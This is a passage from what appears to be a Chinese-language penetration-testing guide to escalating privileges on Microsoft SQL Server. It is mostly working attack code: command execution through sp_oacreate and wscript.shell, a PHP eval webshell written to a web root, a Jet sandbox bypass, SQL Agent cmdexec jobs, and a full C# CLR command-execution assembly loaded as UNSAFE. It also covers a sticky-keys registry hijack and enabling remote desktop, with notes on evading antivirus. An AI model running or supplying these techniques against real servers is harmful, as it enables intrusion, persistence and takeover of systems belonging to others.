Sp_OAGetProperty ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OAMethod ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OASetProperty ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OAStop ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regaddmultistring ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regdeletekey ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regdeletevalue ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regenumvalues ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regremovemultistring ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regwrite ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_dirtree ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regread ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_fixeddrives ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br></code></pre></td></tr></table></figure><p>例mssql2012的上传目录：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\M</span>icrosoft SQL Server<span class="hljs-symbol">\M</span>SSQL12.MSSQLSERVER<span class="hljs-symbol">\M</span>SSQL<span class="hljs-symbol">\B</span>inn<span class="hljs-symbol">\x</span>plog70.dll<br></code></pre></td></tr></table></figure><h5 id="sp-oacreate和sp-oamethod提权"><a href="#sp-oacreate和sp-oamethod提权" class="headerlink" title="sp_oacreate和sp_oamethod提权"></a>sp_oacreate和sp_oamethod提权</h5><p>在xp_cmdshell被删除或不能利用是可以考虑利用sp_oacreate，利用前提需要sqlserver sysadmin账户服务器权限为system（sqlserver2019默认被降权为mssql）。sp_oacreate 主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。</p><p>判断sp_oacreate是否存在：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;SP_OACREATE&#x27;</span>  <span class="hljs-comment">-- 返回1即存在</span><br></code></pre></td></tr></table></figure><p>开关sp_oacreate：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;ole automation procedures&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-comment">-- 关闭</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;ole automation procedures&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br></code></pre></td></tr></table></figure><p>利用wscript.shell组件执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 无回显执行系统命令</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output<br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;C:\\Windows\\System32\\cmd.exe /c whoami&#x27;</span><br><br><span class="hljs-comment">-- 回显执行系统命令结果</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@exec</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@text</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@str</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">8000</span>)<br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output<br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-variable">@exec</span> output,<span class="hljs-string">&#x27;C:\\Windows\\System32\\cmd.exe /c whoami&#x27;</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@exec</span>, <span class="hljs-string">&#x27;StdOut&#x27;</span>, <span class="hljs-variable">@text</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@text</span>, <span class="hljs-string">&#x27;readall&#x27;</span>, <span class="hljs-variable">@str</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">select</span> <span class="hljs-variable">@str</span>;<br></code></pre></td></tr></table></figure><p>利用com组件执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@exec</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@text</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@str</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">8000</span>)<br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;&#123;72C24DD5-D70A-438B-8A42-98424B88AFB8&#125;&#x27;</span>,<span class="hljs-variable">@ffffffff0x</span> output<br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@ffffffff0x</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-variable">@exec</span> output,<span class="hljs-string">&#x27;C:\\Windows\\System32\\cmd.exe /c whoami&#x27;</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@exec</span>, <span class="hljs-string">&#x27;StdOut&#x27;</span>, <span class="hljs-variable">@text</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@text</span>, <span class="hljs-string">&#x27;readall&#x27;</span>, <span class="hljs-variable">@str</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">select</span> <span class="hljs-variable">@str</span>;<br></code></pre></td></tr></table></figure><p>利用filesystemobject写vb脚本（目录必须存在，否则也会显示成功，但是没有文件写入）:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@f</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@t</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@ret</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>, <span class="hljs-string">&#x27;createtextfile&#x27;</span>, <span class="hljs-variable">@f</span> <span class="hljs-keyword">out</span>, <span class="hljs-string">&#x27;C:\phpstudy_pro\www\1.php&#x27;</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">&#x27;writeline&#x27;</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_REQUEST[&quot;a&quot;]);?&gt;&#x27;</span> <span class="hljs-comment">-- 在sqlserver2019+win server2019中测试，win defender会报毒并删除一句话木马。</span><br></code></pre></td></tr></table></figure><h5 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h5><p>沙盒模式是数据库的一种安全功能。在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。利用前提需要sqlserver sysadmin账户服务器权限为system（sqlserver2019默认被降权为mssql），服务器拥有 jet.oledb.4.0 驱动。<br>局限：<br>（1）Microsoft.jet.oledb.4.0一般在32位操作系统上才可以<br>（2）Windows 2008以上 默认无 Access 数据库文件, 需要自己上传 sqlserver2015默认禁用Ad Hoc Distributed Queries，需要开启。</p><p>开启Ad Hoc Distributed Queries：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启Ad Hoc Distributed Queries</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-comment">-- 关闭Ad Hoc Distributed Queries</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br></code></pre></td></tr></table></figure><p>关闭沙盒模式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 关闭沙盒模式</span><br><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br><span class="hljs-comment">-- 恢复默认沙盒模式</span><br><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>沙盒模式参数含义：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">沙盒模式SandBoxMode参数含义（默认是<span class="hljs-number">2</span>）<br><span class="hljs-number">0</span>：在任何所有者中禁止启用安全模式<br><span class="hljs-number">1</span>：为仅在允许范围内<br><span class="hljs-number">2</span>：必须在<span class="hljs-keyword">access</span>模式下<br><span class="hljs-number">3</span>：完全开启<br><span class="hljs-comment">-- 查看沙盒模式</span><br>exec master.dbo.xp_regread <span class="hljs-symbol">&#x27;HKEY_LOCAL_MACHINE</span><span class="hljs-string">&#x27;,&#x27;</span>SOFTWARE\Microsoft\Jet\<span class="hljs-number">4.0</span>\Engines&#x27;, <span class="hljs-symbol">&#x27;SandBoxMode</span>&#x27;<br></code></pre></td></tr></table></figure><p>执行系统命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 执行系统命令</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;cmd.exe /c whoami&quot;)&#x27;</span>)<br></code></pre></td></tr></table></figure><h5 id="SQL-Server-Agent-Job提权"><a href="#SQL-Server-Agent-Job提权" class="headerlink" title="SQL Server Agent Job提权"></a>SQL Server Agent Job提权</h5><p>SQL Server 代理是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业。</p><p>启动sqlagent：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> master.dbo.xp_servicecontrol <span class="hljs-string">&#x27;start&#x27;</span>,<span class="hljs-string">&#x27;SQLSERVERAGENT&#x27;</span>;<br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">use msdb;<br><span class="hljs-keyword">exec</span> sp_delete_job <span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;test&#x27;</span><br><span class="hljs-keyword">exec</span> sp_add_job <span class="hljs-string">&#x27;test&#x27;</span><br><span class="hljs-keyword">exec</span> sp_add_jobstep <span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;cmdexec&#x27;</span>,<span class="hljs-string">&#x27;cmd /c &quot;whoami&gt;c:/1.txt&quot;&#x27;</span>  <span class="hljs-comment">-- 执行命令，并写入1.txt中</span><br><span class="hljs-keyword">exec</span> sp_add_jobserver <span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;test&#x27;</span>,@<span class="hljs-variable">@servername</span><br><span class="hljs-keyword">exec</span> sp_start_job <span class="hljs-string">&#x27;test&#x27;</span>;<br></code></pre></td></tr></table></figure><p>查询1.txt:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">Use model;<br>bulk <span class="hljs-keyword">insert</span> readfile <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;C:\1.txt&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> readfile<br></code></pre></td></tr></table></figure><h5 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h5><p>Microsoft SQL Server 2005之后，实现了对 Microsoft .NET Framework 的公共语言运行时(CLR)的集成。CLR 集成使得现在可以使用 .NET Framework 语言编写代码，从而能够在 SQL Server 上运行，现在就可以通过 C# 来编写 SQL Server 自定义函数、存储过程、触发器等。</p><p>开启CLR：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启CLR</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;clr enabled&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE;<br><span class="hljs-comment">-- 关闭CLR</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;clr enabled&#x27;</span>,<span class="hljs-number">0</span>;RECONFIGURE;<br></code></pre></td></tr></table></figure><p>当导入了不安全的程序集之后，需将数据库标记为可信任的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> DATABASE master <span class="hljs-keyword">SET</span> TRUSTWORTHY <span class="hljs-keyword">ON</span>;<br></code></pre></td></tr></table></figure><p>做完上述准备之后需要编写一个CLR:</p><ol><li>visual studio创建一个sql server数据库项目</li><li>添加SQL CLR C# 存储过程</li><li>写入以下代码：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c#">using System;<br>using System.Diagnostics;<br>using System.Text;<br>using Microsoft.SqlServer.Server;<br>public partial class StoredProcedures<br>&#123;<br>    [Microsoft.SqlServer.Server.SqlProcedure]<br>    public static void CmdExec (String cmd)<br>    &#123;<br>        // Put your code here<br>        SqlContext.Pipe.Send(Command(&quot;cmd.exe&quot;, &quot; /c &quot; + cmd));<br>    &#125;<br><br>    public static string Command(string filename, string arguments)<br>    &#123;<br>        var process = new Process();<br>        process.StartInfo.FileName = filename;<br>        if (!string.IsNullOrEmpty(arguments))<br>        &#123;<br>            process.StartInfo.Arguments = arguments;<br>        &#125;<br>        process.StartInfo.CreateNoWindow = true;<br>        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;<br>        process.StartInfo.UseShellExecute = false;<br>        process.StartInfo.RedirectStandardError = true;<br>        process.StartInfo.RedirectStandardOutput = true;<br>        var stdOutput = new StringBuilder();<br>        process.OutputDataReceived += (sender, args) =&gt; stdOutput.AppendLine(args.Data);<br>        string stdError = null;<br>        try<br>        &#123;<br>            process.Start();<br>            process.BeginOutputReadLine();<br>            stdError = process.StandardError.ReadToEnd();<br>            process.WaitForExit();<br>        &#125;<br>        catch (Exception e)<br>        &#123;<br>            SqlContext.Pipe.Send(e.Message);<br>        &#125;<br>        if (process.ExitCode == 0)<br>        &#123;<br>            SqlContext.Pipe.Send(stdOutput.ToString());<br>        &#125;<br>        else<br>        &#123;<br>            var message = new StringBuilder();<br>            if (!string.IsNullOrEmpty(stdError))<br>            &#123;<br>                message.AppendLine(stdError);<br>            &#125;<br>            if (stdOutput.Length != 0)<br>            &#123;<br>                message.AppendLine(stdOutput.ToString());<br>            &#125;<br>            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code = &quot; + process.ExitCode + &quot;: &quot; + message);<br>        &#125;<br>        return stdOutput.ToString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>右键生成，会在.\项目名称\Database1\bin\Debug下生成4个文件<ul><li>xxx.dacpac</li><li>xxx.dll</li><li>xxx.pdb</li><li>xxx.sql</li></ul></li></ol><p>将dll文件注册进sqlserver：<br>十六进制写入(无文件落地)： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ASSEMBLY sp_cmdExec<br><span class="hljs-keyword">FROM</span> <span class="hljs-number">0</span>x  <span class="hljs-comment">-- 这里写xxx.sql文件里的</span><br><span class="hljs-keyword">WITH</span> PERMISSION_SET <span class="hljs-operator">=</span> UNSAFE<br></code></pre></td></tr></table></figure><p>上传dll文件注册：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ASSEMBLY sp_cmdExec<br><span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;C:\Users\Administrator\Desktop\xxx1.dll&#x27;</span> <span class="hljs-comment">-- 这里写上传dll文件的路径</span><br><span class="hljs-keyword">WITH</span> PERMISSION_SET <span class="hljs-operator">=</span> UNSAFE<br></code></pre></td></tr></table></figure><p>通过SSMS注册DLL：<br>在图形界面点击程序集-新建程序集-选择DLL</p><p>创建存储过程：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">PROCEDURE</span> sp_cmdExec<br><span class="hljs-variable">@Command</span> [nvarchar](<span class="hljs-number">4000</span>)<br><span class="hljs-keyword">WITH</span> <span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">AS</span> CALLER<br><span class="hljs-keyword">AS</span><br><span class="hljs-keyword">EXTERNAL</span> NAME sp_cmdExec.StoredProcedures.CmdExec<br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_cmdExec <span class="hljs-string">&#x27;whoami&#x27;</span>;<br></code></pre></td></tr></table></figure><p>删除存储过程和程序集：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">PROCEDURE</span> sp_cmdExec;<span class="hljs-keyword">DROP</span> ASSEMBLY sp_cmdExec;<br></code></pre></td></tr></table></figure><h5 id="xp-regwrite映像劫持提权"><a href="#xp-regwrite映像劫持提权" class="headerlink" title="xp_regwrite映像劫持提权"></a>xp_regwrite映像劫持提权</h5><p>xp_regread 与 xp_regwrite两个存储过程脚本可以直接读取与写入注册表，利用regwrite函数修改注册表，起到劫持作用。利用前提sqlserver系统权限可以修改注册表。</p><p>判断xp_regwrite是否存在：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_regwrite&#x27;</span>   <span class="hljs-comment">-- 返回1即存在</span><br></code></pre></td></tr></table></figure><p>开启xp_regwrite：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_regwrite&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE<br><span class="hljs-comment">-- 关闭</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_regwrite&#x27;</span>,<span class="hljs-number">0</span>;RECONFIGURE<br></code></pre></td></tr></table></figure><p>修改注册表来劫持粘滞键，将粘滞键修改为打开cmd 在sqlserver2019+winserver2019中测试，win defender和火绒均会拦截：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 劫持注册表</span><br><span class="hljs-keyword">EXEC</span> master..xp_regwrite <span class="hljs-variable">@rootkey</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-variable">@key</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#x27;</span>,<span class="hljs-variable">@value</span>_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Debugger&#x27;</span>,<span class="hljs-variable">@type</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;REG_SZ&#x27;</span>,<span class="hljs-variable">@value</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;c:\windows\system32\cmd.exe&#x27;</span><br><span class="hljs-comment">-- 查看是否劫持成功</span><br><span class="hljs-keyword">EXEC</span> master..xp_regread <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;</span>,<span class="hljs-string">&#x27;Debugger&#x27;</span><br></code></pre></td></tr></table></figure><p>劫持成功后连按5次shift会弹出cmd（win defender会拦截弹出的cmd并删除已经劫持的注册表） 还可以修改注册表来开启3389：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> master.dbo.xp_regwrite<span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,<span class="hljs-string">&#x27;fDenyTSConnections&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h5 id="R和python-dbo-dba权限"><a href="#R和python-dbo-dba权限" class="headerlink" title="R和python(dbo/dba权限)"></a>R和python(dbo/dba权限)</h5><p>在 SQL Server 2017 及更高版本中，R 与 Python 一起随附在机器学习服务中。该服务允许通过 SQL Server 中 